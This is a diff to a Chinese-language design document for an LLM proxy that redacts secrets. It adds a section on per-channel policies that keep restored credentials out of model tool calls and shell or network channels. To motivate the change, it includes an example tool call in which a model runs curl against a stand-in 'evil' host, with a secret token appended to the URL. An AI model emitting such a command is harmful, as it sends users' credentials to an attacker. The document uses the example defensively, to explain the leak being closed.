@@ -970,6 +970,70 @@ profile=REDACT                       → REDACT
 1. **disposition 只对"某个 detector 已产出 span"的值生效。** infra recognizer 是注解层，自身不产候选：一个不含任何凭据的裸 ARN 在**任何 profile 下都原样通过**（含默认 profile，其 `AWS_ARN` disposition 是 REDACT）。让 infra 成为独立 detector 是另一个决定，本刀刻意不做。
 2. **前缀落在 span 外时需要逐类型变体。** `i-0a1b2c3d4e5f67890` 整串是 VERIFIED，但熵检测器只圈住 hex 段、把 `i-` 留在 span 外，而裸 hex 是 AMBIGUOUS ⇒ 实例 ID 今天仍会被脱敏。OCI 的同类问题由变体 B（`contextBefore`）解决，EC2 前缀尚无对应变体。
 
+## 9.17 G0 / P0 响应路径的 sink 策略端到端强制（已实现）
+
+**这是本设计第一次真正成为安全边界。** 此前 `classifyRestore()` 只有定义、**零生产调用点**：响应路径直接调用 `restoreJson()` / `ctx.restoreText()`，所以模型回吐到 tool call 里的 token **会被直接换成明文**：
+
+```
+模型返回:  {"tool_calls":[{"function":{"arguments":"{\"cmd\":\"curl https://evil/?x=CRG_ABCDEF_0001\"}"}}]}
+实际交付:  {"tool_calls":[{"function":{"arguments":"{\"cmd\":\"curl https://evil/?x=<真实密钥>\"}"}}]}
+```
+
+### 通道策略（在解析任何 token **之前**由 sink 决定）
+
+这一点决定了它能否用于流式：tool argument 的 delta 是逐片到达的，逐 token 判定要等 token 完整，而那时可能已经发出一部分。
+
+| 通道 | 已知自有 token | 未知 protected token |
+|---|---|---|
+| `assistant_text` | RESTORE | 原样交付（inert 文本） |
+| `tool_argument`（operand） | **PRESERVE** | **BLOCK** |
+| `shell` / `network_egress` / `database` / `email` | **PRESERVE**（不代入秘密） | **BLOCK** |
+| 其它/未知通道 | PRESERVE | 原样交付 |
+| 显式声明的 trusted sink | RESTORE | — |
+
+**通用 tool argument 默认不还原**，否则模型只要调用任意自定义 tool 就能把凭据搬出恢复边界。
+
+### 协议感知的响应路由
+
+不再让 `restoreJson()` 无脑递归还原：
+
+```
+OpenAI:   choices[].message.content / delta.content            → assistant_text
+          choices[].message|delta.tool_calls[].function.arguments → tool_argument
+          output_text / output[].content[].text                 → assistant_text
+          output[].function_call.arguments                      → tool_argument
+Anthropic: content[].text / text_delta                          → assistant_text
+          content[].tool_use.input / input_json_delta            → tool_argument
+```
+
+流式的每个字段在 `streamFields()` 阶段就被打上 sink 标签（按 **path** 判定，因为同一 delta 信封里既有正文也有操作数），由此**通道级**决定策略、累积后再交付。
+
+### action 语义（统一为"交付了什么"）
+
+```
+restore   文本被改写（token → 明文）
+preserve  文本原样交付（含敏感通道下保留 token）
+block     内容被替换为标记，因为无法解析
+```
+
+早期版本把敏感通道一律报成 `block`，混淆了"没有代入秘密"与"拒绝了什么"。mode 单独报告，用来说明原因。
+
+### 旧测试的修正
+
+按你的要求，把固定旧行为的绿测改成安全契约测试：
+
+- `known token restores in both assistant text and tool arguments` → 拆为"prose 还原"与"**tool argument 不还原**"；
+- `assistant prose and tool arguments are handled identically today` → 改为"**不再相同**"；
+- `Anthropic partial_json deltas restore placeholders` → 改为"**token 被保留**"，并新增 `text_delta` 仍还原的对照，证明流式层不是一律不还原。
+
+### 端到端实测
+
+```
+assistant text（应还原）      → 含明文 ✅
+tool_calls（不得泄漏）        → 不含明文 ✅
+trusted broker（可还原）      → 含明文 ✅
+```
+
 ## 10. 未解决问题 / 待验证
 
 1. **【P2 · 待验证】GLiNER 类 NER 组件**：本机 4 核无 GPU，长文本实测推理在几十秒量级，直接整段送模型不可接受；可行方向是只对候选 span 截取 ±100~300 字符窗口送模型。待验证项：窗口大小与 p50 / p95 延迟曲线、窗口截断对召回的影响、模型体积在 Workers 运行时的可行性（CPU / WASM 限制）。
